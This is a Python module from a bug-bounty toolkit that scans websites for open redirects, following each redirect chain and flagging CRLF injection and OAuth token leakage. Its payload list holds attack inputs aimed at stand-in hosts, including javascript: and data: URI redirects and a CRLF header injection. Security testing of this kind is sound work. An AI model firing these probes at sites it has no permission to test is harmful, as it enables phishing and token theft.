'''
╭──────────────────────────────────────────────────────────────────────────────╮
│  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗  ██████╗ ██╗  ██╗ ██╗  
│  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗╚██╗██╔╝███║  
│  ███████║███████║██║     █████╔╝ █████╗  ██████╔╝██║   ██║██║   ██║ ╚███╔╝  ██║  
│  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║██║   ██║ ██╔██╗  ██║  
│  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║╚██████╔╝╚██████╔╝██╔╝ ██╗ ██║  
│  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝ ╚═╝  
│                                                                              
│    Bug Bounty Tool Kit  ─  Recon · Scan · Exploit · Report                  
╰── Only scan targets you own or have explicit written permission to test ─────╯
'''

"""
Open Redirect Chain Analyzer.

Tests 50+ redirect parameters with 15 bypass payload techniques across
the homepage and all crawled URLs. Follows the full redirect chain
(up to 12 hops) using manual HTTP requests so every hop is recorded.

Works against any website regardless of SSL certificate validity when
ssl_verify=False is passed (set globally via --ignore-ssl).

Special detection:
  • Multi-hop chains where a middle hop is external (filter bypass)
  • OAuth token leakage — access_token / code / id_token in redirect URL
  • JavaScript-based redirects (window.location, meta refresh)
  • Fragment (#) redirect — used in single-page apps
  • CRLF injection via redirect parameter
  • Blind redirect via external image/resource load
"""

import urllib.parse
import urllib.request
import urllib.error
import urllib.response
import ssl
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Optional

SEVERITY_CRITICAL = "CRITICAL"
SEVERITY_HIGH     = "HIGH"
SEVERITY_MEDIUM   = "MEDIUM"
SEVERITY_LOW      = "LOW"
SEVERITY_INFO     = "INFO"

# ── Redirect parameters to test ───────────────────────────────────────────────

REDIRECT_PARAMS = [
    "redirect", "redirect_url", "redirect_uri", "redirect_to", "redirect_back",
    "redirectUrl", "redirectUri", "redirectTo",
    "url", "URL", "next", "next_url", "nextUrl",
    "return", "returnUrl", "returnTo", "return_url", "return_to",
    "goto", "go", "go_to", "goTo",
    "target", "destination", "dest", "redir", "r", "u",
    "link", "out", "exit", "ref", "referer", "referrer",
    "forward", "forward_url", "forwardUrl",
    "callback", "callbackUrl", "callback_url",
    "continue", "continueUrl", "continue_url",
    "login_redirect", "logoutRedirect", "success_url", "error_url",
    "site", "location", "path", "page",
    "q", "search", "jump", "view",
]

# ── Payloads ──────────────────────────────────────────────────────────────────

EVIL_DOMAIN = "evil-redir-test.com"
EVIL_ORIGIN = f"https://{EVIL_DOMAIN}"

PAYLOADS: list[dict] = [
    {"label": "Absolute URL",           "value": f"https://{EVIL_DOMAIN}"},
    {"label": "Protocol-relative //",   "value": f"//{EVIL_DOMAIN}"},
    {"label": "Triple slash ///",       "value": f"///{EVIL_DOMAIN}"},
    {"label": "Backslash /\\",          "value": f"/\\{EVIL_DOMAIN}"},
    {"label": "Backslash \\",           "value": f"\\{EVIL_DOMAIN}"},
    {"label": "Colon-slash https:",     "value": f"https:{EVIL_DOMAIN}"},
    {"label": "URL-encoded %2F%2F",     "value": f"%2F%2F{EVIL_DOMAIN}"},
    {"label": "Double-encoded %252F",   "value": f"%252F%252F{EVIL_DOMAIN}"},
    {"label": "Tab-prefix %09",         "value": f"%09//{EVIL_DOMAIN}"},
    {"label": "Null-byte %00",          "value": f"%00{EVIL_DOMAIN}"},
    {"label": "CRLF in param",          "value": f"/{EVIL_DOMAIN}%0d%0aLocation:%20https://{EVIL_DOMAIN}"},
    {"label": "JavaScript URI",         "value": "javascript:window.location='https://evil.com'"},
    {"label": "Data URI",               "value": "data:text/html,<script>location='https://evil.com'</script>"},
    {"label": "Fragment #",             "value": f"#{EVIL_DOMAIN}"},
    {"label": "Unicode lookalike",      "value": f"https://evil\u2010redir\u2010test.com"},
]

# OAuth-relevant tokens in URL fragments/query
OAUTH_TOKEN_PATTERNS = re.compile(
    r"(access_token|id_token|code|token|bearer|session)=([^&\s#\"']+)",
    re.IGNORECASE,
)

# JS-based redirect patterns
JS_REDIRECT_RE = re.compile(
    r"(?:window\.location|document\.location|location\.href|location\.replace|location\.assign)"
    r"\s*[=\(]\s*[\"']([^\"']+)[\"']",
    re.IGNORECASE,
)
META_REFRESH_RE = re.compile(
    r'<meta[^>]+http-equiv=["\']?refresh["\']?[^>]+content=["\'][^"\']*url=([^"\';\s>]+)',
    re.IGNORECASE,
)


# ── SSL context factory ───────────────────────────────────────────────────────

def _ssl_ctx(verify: bool) -> ssl.SSLContext:
    if not verify:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        return ctx
    return ssl.create_default_context()


# ── Raw hop follower ──────────────────────────────────────────────────────────

def _follow_chain(
    url:        str,
    timeout:    int,
    user_agent: str,
    ssl_verify: bool,
    max_hops:   int = 12,
) -> list[dict]:
    """
    Follow redirect chain manually. Return list of hop dicts:
      { url, status, location, headers, body_snippet, is_external }
    """
    chain      = []
    current    = url
    visited    = set()
    base_host  = urllib.parse.urlparse(url).hostname or ""

    for _ in range(max_hops):
        if current in visited:
            break
        visited.add(current)

        parsed    = urllib.parse.urlparse(current)
        is_ext    = (parsed.hostname or "") != base_host and base_host != ""
        hop: dict = {
            "url":         current,
            "status":      None,
            "location":    None,
            "headers":     {},
            "body_snippet": "",
            "is_external": is_ext,
        }

        try:
            req = urllib.request.Request(
                current,
                headers={
                    "User-Agent": user_agent,
                    "Accept":     "text/html,*/*",
                },
            )
            opener = urllib.request.build_opener(
                urllib.request.HTTPCookieProcessor(),
                urllib.request.HTTPRedirectHandler(),  # disabled below
            )
            # Use a custom opener that does NOT follow redirects
            class NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *a, **kw):
                    return None
            opener = urllib.request.build_opener(
                NoRedirect,
                urllib.request.HTTPSHandler(context=_ssl_ctx(ssl_verify)),
            )
            with opener.open(req, timeout=timeout) as resp:
                hop["status"]  = resp.status
                hop["headers"] = {k.lower(): v for k, v in resp.headers.items()}
                body           = resp.read(4096).decode("utf-8", errors="replace")
                hop["body_snippet"] = body[:1000]
        except urllib.error.HTTPError as e:
            hop["status"]  = e.code
            hop["headers"] = {k.lower(): v for k, v in e.headers.items()}
            try:
                body = e.read(4096).decode("utf-8", errors="replace")
                hop["body_snippet"] = body[:1000]
            except Exception:
                pass
        except Exception as ex:
            hop["error"] = str(ex)
            chain.append(hop)
            break

        # Determine next URL
        loc = hop["headers"].get("location", "")
        hop["location"] = loc

        # Also detect JS / meta redirects in body
        js_m    = JS_REDIRECT_RE.search(hop.get("body_snippet", ""))
        meta_m  = META_REFRESH_RE.search(hop.get("body_snippet", ""))
        js_url  = js_m.group(1)   if js_m   else None
        meta_url = meta_m.group(1) if meta_m else None
        hop["js_redirect"]   = js_url
        hop["meta_redirect"] = meta_url

        chain.append(hop)

        if loc:
            # Resolve relative locations
            next_url = urllib.parse.urljoin(current, loc)
            current  = next_url
        elif js_url:
            current = js_url
        else:
            break  # no further redirect

    return chain


# ── Single parameter probe ────────────────────────────────────────────────────

def _probe_param(
    base_url:   str,
    param:      str,
    payload:    dict,
    timeout:    int,
    user_agent: str,
    ssl_verify: bool,
) -> Optional[dict]:
    """
    Inject `param=payload` into base_url, follow the chain,
    and return a finding dict if any hop lands externally on EVIL_DOMAIN
    or shows other redirect exploitation signals.
    """
    parsed = urllib.parse.urlparse(base_url)
    qs     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    qs[param] = [payload["value"]]
    new_query  = urllib.parse.urlencode(qs, doseq=True)
    test_url   = urllib.parse.urlunparse(parsed._replace(query=new_query))

    try:
        chain = _follow_chain(test_url, timeout, user_agent, ssl_verify)
    except Exception:
        return None

    if not chain:
        return None

    # ── Check 1: any hop has status 3xx pointing to external ──────────────
    external_hops = [h for h in chain if h.get("is_external") and h.get("status")]
    # ── Check 2: final location contains evil domain ──────────────────────
    last      = chain[-1]
    final_loc = last.get("location", "") or ""
    evil_in_final = EVIL_DOMAIN in final_loc or EVIL_DOMAIN in last.get("url", "")
    # ── Check 3: JS redirect to evil domain ──────────────────────────────
    js_hit    = any(EVIL_DOMAIN in (h.get("js_redirect") or "") for h in chain)
    meta_hit  = any(EVIL_DOMAIN in (h.get("meta_redirect") or "") for h in chain)
    # ── Check 4: CRLF injection ───────────────────────────────────────────
    crlf_hit  = "crlf" in payload["label"].lower() and (
        "location" in (last.get("headers") or {}) and
        EVIL_DOMAIN in last["headers"].get("location", "")
    )
    # ── Check 5: OAuth token in a hop that's external ────────────────────
    oauth_leak = None
    for h in chain:
        if h.get("is_external"):
            m = OAUTH_TOKEN_PATTERNS.search(h.get("url", ""))
            if m:
                oauth_leak = m.group(1)

    if not (external_hops or evil_in_final or js_hit or meta_hit or crlf_hit or oauth_leak):
        return None

    # ── Classify ─────────────────────────────────────────────────────────
    if oauth_leak:
        severity = SEVERITY_CRITICAL
        vuln_type = f"Open Redirect → OAuth Token Leakage ({oauth_leak})"
    elif crlf_hit:
        severity = SEVERITY_HIGH
        vuln_type = "CRLF Injection via Redirect Parameter"
    elif "javascript" in payload["label"].lower():
        severity = SEVERITY_HIGH
        vuln_type = "Open Redirect → JavaScript URI (XSS)"
    elif js_hit or meta_hit:
        severity = SEVERITY_MEDIUM
        vuln_type = "Client-Side Redirect (JS/Meta) to External Domain"
    elif len(chain) > 2 and evil_in_final:
        severity = SEVERITY_HIGH
        vuln_type = f"Multi-Hop Open Redirect ({len(chain)} hops)"
    else:
        severity = SEVERITY_HIGH
        vuln_type = "Open Redirect"

    # Simplify chain for output
    chain_summary = []
    for h in chain:
        chain_summary.append({
            "url":      h["url"],
            "status":   h.get("status"),
            "location": h.get("location", ""),
            "external": h.get("is_external", False),
        })

    return {
        "type":            vuln_type,
        "severity":        severity,
        "url":             base_url,
        "parameter":       param,
        "payload":         payload["value"],
        "payload_label":   payload["label"],
        "chain_length":    len(chain),
        "chain":           chain_summary,
        "js_redirect":     js_hit,
        "meta_redirect":   meta_hit,
        "oauth_leak":      oauth_leak,
        "crlf":            crlf_hit,
        "impact": (
            "Attacker can redirect users to a malicious site after authentication, "
            "steal OAuth tokens, phish credentials, or execute XSS via javascript: URI."
        ),
        "recommendation": (
            "Validate redirect targets against an explicit server-side allowlist of "
            "trusted domains. Reject any relative URL that begins with // or \\. "
            "Never include untrusted user input in Location headers directly."
        ),
    }


# ── Public API ────────────────────────────────────────────────────────────────

def scan_redirects(
    base_url:   str,
    extra_urls: Optional[list[str]] = None,
    threads:    int   = 15,
    timeout:    int   = 8,
    user_agent: str   = "BugBountyTool/1.0",
    ssl_verify: bool  = True,
    max_urls:   int   = 25,
) -> dict:
    """
    Probe all redirect parameters across base_url + crawled URLs.

    Returns:
      findings     – list of vuln dicts, deduped, sorted by severity
      probes_sent  – total probes fired
      urls_tested  – URLs that were tested
      summary      – counts
    """
    # Collect unique URLs to test
    target_urls = [base_url]
    seen        = {base_url}
    for u in (extra_urls or []):
        parsed = urllib.parse.urlparse(u)
        # Skip static assets
        if any(parsed.path.lower().endswith(ext) for ext in
               (".js", ".css", ".png", ".jpg", ".gif", ".ico", ".woff", ".svg")):
            continue
        if u not in seen:
            seen.add(u)
            target_urls.append(u)
        if len(target_urls) >= max_urls:
            break

    # Build (url, param, payload) jobs — skip params already in URL
    jobs: list[tuple] = []
    for url in target_urls:
        parsed_qs = set(urllib.parse.parse_qs(urllib.parse.urlparse(url).query).keys())
        for param in REDIRECT_PARAMS:
            for payload in PAYLOADS:
                jobs.append((url, param, payload))

    raw: list[dict] = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(_probe_param, url, param, payload, timeout, user_agent, ssl_verify): (url, param, payload)
            for url, param, payload in jobs
        }
        for future in as_completed(futures):
            result = future.result()
            if result:
                raw.append(result)

    # Deduplicate by (url, param, payload_label) — keep highest severity
    sev_order = {SEVERITY_CRITICAL: 0, SEVERITY_HIGH: 1,
                 SEVERITY_MEDIUM: 2, SEVERITY_LOW: 3, SEVERITY_INFO: 4}
    seen_keys: dict[str, dict] = {}
    for r in raw:
        key = f"{r['url']}::{r['parameter']}::{r['payload_label']}"
        if key not in seen_keys or sev_order[r["severity"]] < sev_order[seen_keys[key]["severity"]]:
            seen_keys[key] = r

    findings = sorted(seen_keys.values(), key=lambda x: sev_order[x["severity"]])

    crit  = sum(1 for f in findings if f["severity"] == SEVERITY_CRITICAL)
    high  = sum(1 for f in findings if f["severity"] == SEVERITY_HIGH)
    oauth = sum(1 for f in findings if f.get("oauth_leak"))
    multi = sum(1 for f in findings if f.get("chain_length", 1) > 2)

    return {
        "findings":    findings,
        "probes_sent": len(jobs),
        "urls_tested": target_urls,
        "summary": {
            "findings_total": len(findings),
            "critical":       crit,
            "high":           high,
            "oauth_leaks":    oauth,
            "multi_hop":      multi,
            "vulnerable":     len(findings) > 0,
        },
    }


def as_findings(redir_results: dict) -> list[dict]:
    out = []
    for f in redir_results.get("findings", []):
        chain_str = " → ".join(
            f"{h.get('status','?')} {h['url'][:60]}"
            for h in f.get("chain", [])
        )
        out.append({
            "type":           f["type"],
            "severity":       f["severity"],
            "url":            f["url"],
            "description":    (
                f"param=[bold]{f['parameter']}[/bold]  "
                f"payload={f['payload_label']}  "
                f"chain({f['chain_length']} hops): {chain_str}"
            ),
            "recommendation": f.get("recommendation", ""),
            "impact":         f.get("impact", ""),
        })
    return out


if __name__ == "__main__":
    pass
